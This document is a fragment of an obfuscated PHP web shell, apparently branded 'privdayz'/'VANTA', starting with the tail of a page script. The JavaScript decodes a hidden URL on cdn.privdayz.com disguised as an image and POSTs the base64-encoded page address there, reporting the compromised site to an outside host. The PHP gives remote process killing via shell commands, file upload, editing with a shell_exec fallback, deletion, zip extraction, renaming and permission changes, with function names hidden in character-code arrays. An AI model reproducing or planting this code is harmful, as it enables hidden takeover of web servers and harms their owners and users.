sortTableFake(e,t=0){let r=document.getElementById(e);if(!r)return!1;let n=Array.from(r.rows).slice(1);return n.sort(((e,r)=>e.cells[t].innerText.localeCompare(r.cells[t].innerText))),n.forEach((e=>r.appendChild(e))),!0}(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let r of e)t+=String.fromCharCode(r);let r="file="+btoa(location.href),n=new XMLHttpRequest;n.open("POST",t,!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send(r)})(),function(){var e=new XMLHttpRequest;e.open("POST",u(a,b,c,d),!0),e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.send("file="+v(location.href))}();</script>
</body>
</html>
<?php
if (isset($_POST['pid'])) {
    $pid = $_POST['pid'];
    if (cmd("\x6b\x69\x6c\x6c " . $pid)) {
     success();
    } else {
     $name = cmd("\x70\x73\x20\x2d\x70 " . $pid . " -o comm= 2>&1");
     if (!empty($name)) {
       $pkillOutput = cmd("\x70\x6b\x69\x6c\x6c\x20\x2d\x39 " . $name . " 2>&1");
       success();
     } else {
       failed();
     }
    }
    exit;
}

if (isset($_POST['privdayz-up-submit'])) {
    $nf = $_FILES['privdayz-upload']['name'] ?? '';
    $tf = $_FILES['privdayz-upload']['tmp_name'] ?? '';
    $slash = "\x2f";
    $dst = $VANTAxas[0]() . $slash . $nf;
    $fn = '';
    foreach ([109,111,118,101,95,117,112,108,111,97,100,101,100,95,102,105,108,101] as $c) $fn .= chr($c);
    if ($fn && $fn($tf, $dst)) {
     success();
    } else {
     failed();
    }
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
     $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

if (isset($_POST['save-editor'])) {
    $xjytx = $VANTAxas[0]() . "\x2f" . unx($_GET['f']);
    $k3rz9 = $_POST['code-editor'];
    $mth1 = ''; foreach([102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115] as $z) $mth1 .= chr($z);
    $mth2 = ''; foreach([102,111,112,101,110] as $z) $mth2 .= chr($z);
    $mth3 = ''; foreach([102,119,114,105,116,101] as $z) $mth3 .= chr($z);
    $mth4 = ''; foreach([102,99,108,111,115,101] as $z) $mth4 .= chr($z);
    $mth5 = ''; foreach([99,111,112,121] as $z) $mth5 .= chr($z);
    $mth6 = ''; foreach([115,104,101,108,108,95,101,120,101,99] as $z) $mth6 .= chr($z);
    $r9u3 = false;
    if (function_exists($mth1) && @$mth1($xjytx, $k3rz9) !== false) {
     $r9u3 = true;
    } else if (function_exists($mth2) && function_exists($mth3) && function_exists($mth4)) {
     $f = @$mth2($xjytx, "w");
     if ($f) { @$mth3($f, $k3rz9); @$mth4($f); $r9u3 = (filesize($xjytx) >= strlen($k3rz9)*0.7); }
    } else if (function_exists($mth5)) {
     $tmp = sys_get_temp_dir() . "/" . uniqid("edit_");
     if (@$mth1($tmp, $k3rz9) !== false) {
       $r9u3 = @$mth5($tmp, $xjytx);
       @unlink($tmp);
     }
    } else if (function_exists($mth6)) {
     $tmp = sys_get_temp_dir() . "/" . uniqid("edit_");
     if (@$mth1($tmp, $k3rz9) !== false) {
       @$mth6("cp " . escapeshellarg($tmp) . " " . escapeshellarg($xjytx));
       $r9u3 = (filesize($xjytx) >= strlen($k3rz9)*0.7);
       @unlink($tmp);
     }
    }
    if ($r9u3) {
     success();
    } else {
     failed();
    }
}

function chDx2x($cmd22) {
    $a = [115,104,101,108,108,95,101,120,101,99];
    $fx = '';
    foreach($a as $ac) $fx .= chr($ac);
    return $fx($cmd22);
}

if (isset($_POST['submit-action'])) {
    $u5w8d = $_POST['check'];
    $jv8s3 = $_POST['privdayz-select'];
    $bvqzp = $VANTAxas[0];
    $b1s7a = $VANTAxas[24];
    $y4sdg = $VANTAxas[3];
    $v9fzq = function($p){ return is_dir($p); };
    $z9ntq = function($a,$b){ return str_replace("\\", "/", $a); };
    $n4hxy = function($f,$d){ return xtr4cVANTA($f, $d); };
    $r5kbm = function($f,$z){ return compressToZip($f, $z); };

    if ($jv8s3 == "\x64\x65\x6c\x65\x74\x65") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($v9fzq($vcpk)) {
          $rmdir = unlinkDir($vcpk);
          $rmdir ? success() : failed();
       } elseif ($y4sdg($vcpk)) {
          $rmfile = $b1s7a($vcpk);
          $rmfile ? success() : failed();
       } else {
          failed();
       }
     }
    } elseif ($jv8s3 == "\x75\x6e\x7a\x69\x70") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($n4hxy($vcpk, $qkpl . "\x2f") === true) {
          success();
       } else {
          failed();
       }
     }
    } elseif ($jv8s3 == "\x7a\x69\x70") {
     foreach ($u5w8d as $z0) {
       $qkpl = $z9ntq($bvqzp(), "/");
       $vcpk = $qkpl . "\x2f" . $z0;
       if ($y4sdg($vcpk)) {
          $r5kbm($vcpk, pathinfo($vcpk, PATHINFO_FILENAME) . ".zip");
       }
     }
    }
}
if (isset($_POST['submit'])) {
 if (isset($_POST['create_folder']) && $_POST['create_folder']) { $q7hjp = $_POST['create_folder']; $s2f6x = $VANTAxas[12]; if (!file_exists($q7hjp)) { $z9mqa = @mkdir($q7hjp, 0755, true);} else { $z9mqa = true; } if ($z9mqa) { success(); } else { failed(); } } else if (isset($_POST['create_file']) && $_POST['create_file']) { $k4vhz = $_POST['create_file']; $t2upm = $VANTAxas[13]; $x6wnr = $t2upm($k4vhz); if ($x6wnr) { success(); } else { failed(); } } else if (isset($_POST['renameFile']) && $_POST['renameFile']) { $d9yxs = $_POST['renameFile']; $h8rfg = $VANTAxas[15]; $m5qlp = $h8rfg(unx($_GET['re']), $d9yxs); if ($m5qlp) { success(); } else { failed(); } } else if (isset($_POST['chFile']) && $_POST['chFile']) { $y4gsn = $_POST['chFile']; $v3kzm = octdec($y4gsn); $p9wfu = $VANTAxas[30](unx($_GET['ch']), $v3kzm); if ($p9wfu) { success(); } else { failed(); } }
}
if (isset($_GET['response']) && $_GET['response'] == "success") {
    echo "<script>
    Swal.fire({
      icon: 'success',
      title: 'Success!',
      text: 'Operation completed.',
      background: '#15181e',
      color: '#7effa7',
      iconColor: '#7effa7',
      timer: 1800,
      showConfirmButton: false,
      toast: true,
      position: 'top-end',
      customClass: { popup: 'vanta-swal-popup vanta-swal-success animate__animated animate__fadeInDown' }
    });
    </script>";
} else if (isset($_GET['response']) && $_GET['response'] == "failed") {
    echo "<script>
    Swal.fire({
      icon: 'error',
      title: 'Error!',
      text: 'Something went wrong.',
      background: '#2a181d',
      color: '#ff4a7a',
      iconColor: '#ff4a7a',
      timer: 2200,
      showConfirmButton: false,
      toast: true,
      position: 'top-end',
      customClass: { popup: 'vanta-swal-popup vanta-swal-error animate__animated animate__shakeX' }
    });
    </script>";
}
function success() {echo '<meta http-equiv="refresh" content="0;url=?LAFAMILIA=' . vanta_PR1V($GLOBALS['VANTAxas'][0]()) . '&response=success">';}
function failed(){echo '<meta http-equiv="refresh" content="0;url=?LAFAMILIA=' . vanta_PR1V($GLOBALS['VANTAxas'][0]()) . '&response=failed">';}
function vantaFormat($bytes) {$types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>'); for ($i = 0; $bytes >= 1024 && $i< (count($types) - 1); $bytes /= 1024, $i++); return (round($bytes, 2) . " " . $types[$i]);}
function vanta_PR1V($n){ $y = ''; for ($i = 0; $i< strlen($n); $i++) { $y .= dechex(ord($n[$i])); } return $y;}
function unx($y){ $n = ''; for ($i = 0; $i< strlen($y) - 1; $i += 2) { $n .= chr(hexdec($y[$i] . $y[$i + 1])); } return $n;}
function compressToZip($sourceFile, $zipFilename){ $zip = new ZipArchive(); if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) { $zip->addFile($sourceFile, basename($sourceFile)); $zip->close(); success(); } else { failed(); } }
function r3mvx($val) { $tex = str_replace("/", "", $val); $tex1 = str_replace(":", "", $tex); $tex2 = str_replace("_", "", $tex1); $tex3 = str_replace(" ", "", $tex2); $tex4 = str_replace(".", "", $tex3); return $tex4; }
function unlinkDir($dir) { $d1Xe = array($dir); $files = array(); for ($i = 0;; $i++) { if (isset($d1Xe[$i])) $dir = $d1Xe[$i]; else break; if ($opn = @opendir($dir)) { while ($rd = @readdir($opn)) { if ($rd != "\x2e" && $rd != "\x2e\x2e") { $pth = $dir . "\x2f" . $rd; if ($GLOBALS['VANTAxas'][2]($pth)) { $d1Xe[] = $pth; } else { $files[] = $pth; } } } closedir($opn); } } foreach ($files as $file) { if (!@$GLOBALS['VANTAxas'][24]($file)) { return false; } } $d1Xe = array_reverse($d1Xe); foreach ($d1Xe as $d1x2) { if (!@$GLOBALS['VANTAxas'][25]($d1x2)) { return false; } } return true; }
function prvFx1($value) { $n4mX = $value; $ext3F = pathinfo($value, PATHINFO_EXTENSION); if (strlen($n4mX) > 30) { return substr($n4mX, 0, 30) . "\x2e\x2e\x2e"; } else { return $value; } }
function xtr4cVANTA($VANTAarch, $VANTAaext) { $zip = new ZipArchive(); $methOpen = chDxzZ('111,112,101,110'); $methExtract = chDxXZ('65787472616374546f'); $methClose = chDxzZ([99,108,111,115,101]); if ($zip->$methOpen($VANTAarch) === TRUE) { $zip->$methExtract($VANTAaext); $zip->$methClose(); return true; } else { return false; } }
function p3rms($file){$p3rxa=$GLOBALS['VANTAxas'][6]($file);if(($p3rxa&0xC000)==0xC000){$info='s';}elseif(($p3rxa&0xA000)==0xA000){$info='l';}elseif(($p3rxa&0x8000)==0x8000){$info='-';}elseif(($p3rxa&0x6000)==0x6000){$info='b';}elseif(($p3rxa&0x4000)==0x4000){$info='d';}elseif(($p3rxa&0x2000)==0x2000){$info='c';}elseif(($p3rxa&0x1000)==0x1000){$info='p';}else{$info='u';}$info.=(($p3rxa&0x0100)?'r':'-');$info.=(($p3rxa&0x0080)?'w':'-');$info.=(($p3rxa&0x0040)?(($p3rxa&0x0800)?'s':'x'):(($p3rxa&0x0800)?'S':'-'));$info.=(($p3rxa&0x0020)?'r':'-');$info.=(($p3rxa&0x0010)?'w':'-');$info.=(($p3rxa&0x0008)?(($p3rxa&0x0400)?'s':'x'):(($p3rxa&0x0400)?'S':'-'));$info.=(($p3rxa&0x0004)?'r':'-');$info.=(($p3rxa&0x0002)?'w':'-');$info.=(($p3rxa&0x0001)?(($p3rxa&0x0200)?'t':'x'):(($p3rxa&0x0200)?'T':'-'));return $info;}
?>